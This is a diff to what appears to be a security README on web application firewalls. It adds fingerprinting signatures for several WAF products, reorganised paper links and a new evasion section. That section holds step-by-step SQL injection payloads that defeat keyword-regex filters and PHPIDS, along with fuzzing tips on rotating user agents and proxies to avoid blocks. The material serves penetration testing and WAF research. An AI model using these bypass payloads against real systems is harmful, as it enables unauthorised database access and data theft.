@@ -91,7 +91,7 @@ Feel free to [contribute]().
     </tr>
     <tr>
         <td>
-             <a href="https://www.blockdos.net>BlockDoS</a>
+             <a href="https://www.blockdos.net">BlockDoS</a>
         </td>
         <td>A WAF solution which features high performance in-built content delivery systems, custom SSL, DNS protection, dynamic caching and stable DDoS protection.
         </td>
@@ -130,10 +130,11 @@ One that uses a mixed concept of blacklisting and whitelisting stuff.
 
 ### Where To Look:
 - Always look out for common ports that expose that a WAF `80`, `443`, `8000`, `8008`, `8080`, `8088`.
-> __Tip:__ You can use automate this easily by commandline using a screenshot taker like [WebScreenShot](https://github.com/maaaaz/webscreenshot).
+    > __Tip:__ You can use automate this easily by commandline using a screenshot taker like [WebScreenShot](https://github.com/maaaaz/webscreenshot).
 - Some WAFs set their own cookies in requests (eg. Citrix Netscaler, Yunsuo WAF).
 - Some associate themselves with separate headers (eg. Anquanbao WAF, Amazon AWS WAF). 
 - Some often alter headers and jumble characters to confuse attacker (eg. Citrix Netscaler, Big IP WAF).
+- Some (often rare) expose themselves in the `Server` header
 - Some WAFs expose themselves in the response content (eg. DotDefender, Armor, truShield Sitelock).
 - Other WAFs reply with unusual response codes upon malicious requests (eg. WebKnight).
 
@@ -143,9 +144,10 @@ One that uses a mixed concept of blacklisting and whitelisting stuff.
 3. If there is a login page somewhere, try some common (easily detectable) payloads like `' or 1 = 1 --`.
 4. If there is some search box or input field somewhere, try detecting payloads like `<script>alert()</script>`.
 5. Make GET requests with outdated protocols like `HTTP/0.9` (`HTTP/0.9` does not support POST type queries).
-6. Drop Action Technique - Send a raw crafted FIN/RST packet to server and identify response.
-> __Tip:__ This method could be easily achieved with tools like [HPing3](http://www.hping.org) or [Scapy](https://scapy.net).
-7. Side Channel Attacks - Examine the timing behaviour of the request and response content. 
+6. Many a times, the WAF varies the `Server` header upon different types of interactions.
+7. Drop Action Technique - Send a raw crafted FIN/RST packet to server and identify response.
+    > __Tip:__ This method could be easily achieved with tools like [HPing3](http://www.hping.org) or [Scapy](https://scapy.net).
+8. Side Channel Attacks - Examine the timing behaviour of the request and response content. 
 
 ## WAF Detection
 Wanna detect WAFs? Lets see how.
@@ -293,6 +295,55 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            Bekchy (Faydata)
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response headers contains <code>Bekchy - Access Denied</code> text.</li>
+                    <li>Blocked response page contains reference to <code>https://bekchy.com/report</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            BitNinja
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page may contain:</li>
+                    <ul>
+                        <li><code>Security check by BitNinja</code> text.</li>
+                        <li><code>your IP will be removed from BitNinja</code>.</li>
+                        <li><code>Visitor anti-robot validation</code> text.</li>
+                    </ul>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Bluedon IST
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li><code>Server</code> header contains <code>BDWAF</code> field value.</li>
+                    <li>Blocked response page contains to <code>Bluedon Web Application Firewall</code> text.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             BIG-IP ASM (F5 Networks)
         </td>
         <td>
@@ -373,7 +424,7 @@ Wanna detect WAFs? Lets see how.
                 <li><b>Detectability: </b>Moderate</li>
                 <li><b>Detection Methodology:</b></li>
                 <ul>
-                    <li>Response content has<code> Cloudbric</code> and <code>Malicious Code Detected</code> values.</li>
+                    <li>Response content has <code>Cloudbric</code> and <code>Malicious Code Detected</code> texts.</li>
                 </ul>
             </ul>
         </td>
@@ -440,11 +491,25 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            GoDaddy Firewall
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains value<br> <code>Access Denied - GoDaddy Website Firewall</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             IBM WebSphere DataPower
         </td>
         <td>
             <ul>
-                <li><b>Detectability: </b>Moderate</li>
+                <li><b>Detectability: </b>Difficult</li>
                 <li><b>Detection Methodology:</b></li>
                 <ul>
                     <li>Response headers contains field value value <code>X-Backside-Transport</code> with value <code>OK</code> or <code>FAIL</code>.</li>
@@ -1092,15 +1157,18 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            ZenEdge Firewall
+            WP Cerber Firewall
         </td>
         <td>
             <ul>
-                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detectability: </b>Moderate</li>
                 <li><b>Detection Methodology:</b></li>
                 <ul>
-                    <li>Blocked response page contains reference to <code>zenedge/assets/</code> directory.</li>
-                    <li>Headers contain the <code>ZENEDGE</code> keyword.</li>
+                    <li>Blocked response page contains:
+                    <ul>
+                        <li><code>We're sorry, you are not allowed to proceed</code> text.</li>
+                        <li><code>Your request looks suspicious or similar to automated requests from spam posting software</code> warning.</li>
+                    </ul> 
                 </ul>
             </ul>
         </td>
@@ -1134,10 +1202,135 @@ Wanna detect WAFs? Lets see how.
             </ul>
         </td>
     </tr>
+    <tr>
+        <td>
+            ZenEdge Firewall
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains reference to <code>zenedge/assets/</code> directory.</li>
+                    <li>Headers contain the <code>ZENEDGE</code> keyword.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
 </table>
 
 ## Evasion Techniques
 Lets look at some methods of bypassing and evading WAFs.
+
+### Fuzzing/Bruteforcing:
+- __Method:__
+Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
+- Wordlists specifically for fuzzing - [Seclists Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing).
+- Can be done with automated tools like BurpSuite Intruder.
+
+- __Technique:__
+- Load up your wordlist into Burp Intruder/custom fuzzer and start the bruteforce.
+- Record/log all responses from the different payloads fuzzed.
+- Use random user-agents, ranging from Chrome Desktop to iPhone browser.
+- If blocking noticed, increase fuzz latency (eg. 2-4 secs)
+- Always use proxies, since chances are real that your IP gets blocked.
+
+- __Drawback:__
+- This method often fails. 
+- Many a times your IP will be blocked (temporarily/permanently).
+
+### Regex-Reversing:
+- __Method:__
+- Most efficient method of bypassing WAFs.
+- Some WAFs rely upon matching the attack payloads with the signatures in their databases.
+- Payload matches the reg-ex the WAF triggers alarm.
+
+- __Techniques:__
+
+##### Step 1:
+Keyword filer: `and`, `or`, `union`
+----
+Possible PHP Filter Code: `preg_match('/(and|or|union)/i', $id)`
+- __Filtered Injection__: `union select user, password from users`
+- __Bypassed Injection__: `1 || (select user from users where user_id = 1) = 'admin'`
+
+##### Step 2:
+Keyword filer: `and`, `or`, `union`, `where`
+----
+Possible PHP Filter Code: `preg_match('/(and|or|union|where)/i', $id)`
+- __Filtered Injection__: `1 || (select user from users where user_id = 1) = 'admin'`
+- __Bypassed Injection__: `1 || (select user from users limit 1) = 'admin'`
+
+##### Step 3:
+Keyword filer: `and`, `or`, `union`, `where`, `limit`
+----
+Possible PHP Filter Code: `preg_match('/(and|or|union|where|limit)/i', $id)`
+- __Filtered Injection__: `1 || (select user from users limit 1) = 'admin'`
+- __Bypassed Injection__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
+
+##### Step 4:
+Keyword filer: `and`, `or`, `union`, `where`, `limit`, `group by`
+----
+Possible PHP Filter Code: `preg_match('/(and|or|union|where|limit|group by)/i', $id)`
+- __Filtered Injection__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
+- __Bypassed Injection__: `1 || (select substr(group_concat(user_id),1,1) user from users ) = 1`
+
+##### Step 5:
+Keyword filer: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`
+----
+Possible PHP Filter Code:    `preg_match('/(and|or|union|where|limit|group by|select)/i', $id)`
+- __Filtered Injection__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
+- __Bypassed Injection__: `1 || 1 = 1 into outfile 'result.txt'`
+- __Bypassed Injection__: `1 || substr(user,1,1) = 'a'`
+
+##### Step 6:
+Keyword filer: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`
+----
+Possible PHP Filter Code: `preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)`
+- __Filtered Injection__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
+- __Bypassed Injection__: `1 || user_id is not null`
+- __Bypassed Injection__: `1 || substr(user,1,1) = 0x61`
+- __Bypassed Injection__: `1 || substr(user,1,1) = unhex(61)`
+
+##### Step 7:
+Keyword filer: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`
+----
+Possible Possible PHP Filter Code:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)`
+- __Filtered Injection__: `1 || substr(user,1,1) = unhex(61)`
+- __Bypassed Injection__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
+
+##### Step 8:
+Keyword filer: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`
+----
+Possible PHP Filter Code:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)`
+- __Filtered Injection__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
+- __Bypassed Injection__: `1 || lpad(user,7,1)`
+
+##### Step 9:
+Keyword filer: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`, `white space`
+----
+Possible PHP Filter Code:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)`
+- __Filtered Injection__: `1 || lpad(user,7,1)`
+- __Bypassed Injection__: `1%0b||%0blpad(user,7,1)`
+
+PHPIDS generally blocks input containing = or ( or ' following with any a string or integer e.g. 1 or 1=1, 1 or '1', 1 or char(97). However, it can be bypassed using a statement that does not contain =, ( or ' symbols. 
+
+#### Scenario 1:
+- __Filtered Injection__: `1 or 1 = 1`
+- __Bypassed Injection__: `1 or 1`
+
+#### Scenario 2:
+- __Filtered injection__: `1 union select 1, table_name from information_schema.tables where table_name = 'users'`
+- __Filtered Injection__: `1 union select 1, table_name from information_schema.tables where table_name between 'a' and 'z'`
+- __Filtered Injection__: `1 union select 1, table_name from information_schema.tables where table_name between char(97) and char(122)`
+- __Bypassed Injection__: `1 union select 1, table_name from information_schema.tables where table_name between 0x61 and 0x7a`
+- __Bypassed Injection__: `1 union select 1, table_name from information_schema.tables where table_name like 0x7573657273`
+
+- __Drawbacks:__
+- This method is time consuming.
+
+## Google Dorks Approach:
+- 
 
 ## Awesome Tools
 ### WAF Fingerprinting:
@@ -1212,17 +1405,19 @@ whatwaf -u <target> --ra --throttle 2
 ```
 
 ## Presentations & Research Papers
+### Research Papers:
+- [Protocol Level WAF Evasion](papers/Qualys%20Guide%20-%20Protocol-Level%20WAF%20Evasion.pdf) - A protocol level WAF evasion techniques and analysis by [Qualys](https://www.qualys.com).
+- [Neural Network based WAF for SQLi](papers/Artificial%20Neural%20Network%20based%20WAF%20for%20SQL%20Injection.pdf) - A paper about building a neural network based WAF for detecting SQLi attacks.
+- [Bypassing Web Application Firewalls with HTTP Parameter Pollution](papers/Bypassing%20Web%20Application%20Firewalls%20with%20HTTP%20Parameter%20Pollution.pdf) - A ressearch paper from [Exploit DB](https://exploit-db.com) about effectively bypassing WAFs via HTTP Parameter Pollution.
+- [WAF Evasion Testing](papers/SANS%20Guide%20-%20WAF%20Evasion%20Testing.pdf) - A WAF evasion testing guide from [SANS](https://www.sans.org).
+- [WASC WAF Evaluation Criteria](papers/WASC%20WAF%20Evaluation%20Criteria.pdf) - A guide for WAF Evaluation from [Web Application Security Consortium](http://www.webappsec.org)
+- [WAF Evaluation and Analysis](papers/Web%20Application%20Firewalls%20-%20Evaluation%20and%20Analysis.pdf) - A paper about WAF evaluation and analysis of 2 most used WAFs (ModSecurity & WebKnight) from [University of Amsterdam](http://www.uva.nl).
+- [Bypassing all WAF XSS Filters](papers/Evading%20All%20Web-Application%20Firewalls%20XSS%20Filters.pdf) - A paper about bypassing all XSS filter rules and evading WAFs for XSS.
+- [Beyond SQLi - Obfuscate and Bypass WAFs](papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt) - A research paper from [Exploit Database](https://exploit-db.com) about obfuscating SQL injection queries to effectively bypass WAFs.
+
 ### Presentations:
 - [WAF Profiling & Evasion Techniques](presentations/OWASP%20WAF%20Profiling%20&%20Evasion.pdf) - A WAF testing and evasion guide from [OWASP](https://www.owasp.org).
 - [Protocol Level WAF Evasion Techniques](presentations/BlackHat%20US%2012%20-%20Protocol%20Level%20WAF%20Evasion%20(Slides).pdf) - A presentation at about efficiently evading WAFs at protocol level from [BlackHat US 12](https://www.blackhat.com/html/bh-us-12/).
 - [Analysing Attacking Detection Logic Mechanisms](presentations/BlackHat%20US%2016%20-%20Analysis%20of%20Attack%20Detection%20Logic.pdf) - A presentation about WAF logic applied to detecting attacks from [BlackHat US 16](https://www.blackhat.com/html/bh-us-16/).
 - [WAF Bypasses and PHP Exploits](presentations/WAF%20Bypasses%20and%20PHP%20Exploits%20(Slides).pdf) - A presentation about evading WAFs and developing related PHP exploits.
 - [Playing Around with WAFs](presentations/Playing%20Around%20with%20WAFs.pdf) - A small presentation about WAF profiling and playing around with them from [Defcon 16](http://www.defcon.org/html/defcon-16/dc-16-post.html).
-
-### Research Papers:
-- [WASC WAF Evaluation Criteria](papers/WASC%20WAF%20Evaluation%20Criteria.pdf) - A guide for WAF Evaluation from [Web Application Security Consortium](http://www.webappsec.org)
-- [Protocol Level WAF Evasion](papers/Qualys%20Guide%20-%20Protocol-Level%20WAF%20Evasion.pdf) - A protocol level WAF evasion techniques and analysis by [Qualys](https://www.qualys.com).
-- [WAF Evasion Testing](papers/SANS%20Guide%20-%20WAF%20Evasion%20Testing.pdf) - A WAF evasion testing guide from [SANS](https://www.sans.org).
-- [WAF Evaluation and Analysis](papers/Web%20Application%20Firewalls%20-%20Evaluation%20and%20Analysis) - A paper about WAF evaluation and analysis of 2 most used WAFs (ModSecurity & WebKnight) from [University of Amsterdam](http://www.uva.nl).
-- [Bypassing all WAF XSS Filters](papers/Evading%20All%20Web-Application%20Firewalls%20XSS%20Filters.pdf) - A paper about bypassing all XSS filter rules and evading WAFs for XSS. 
-- [Neural Network based WAF for SQLi](papers/Artificial%20Neural%20Network%20based%20WAF%20for%20SQL%20Injection) - A paper about building a neural network based WAF for detecting SQLi attacks.								
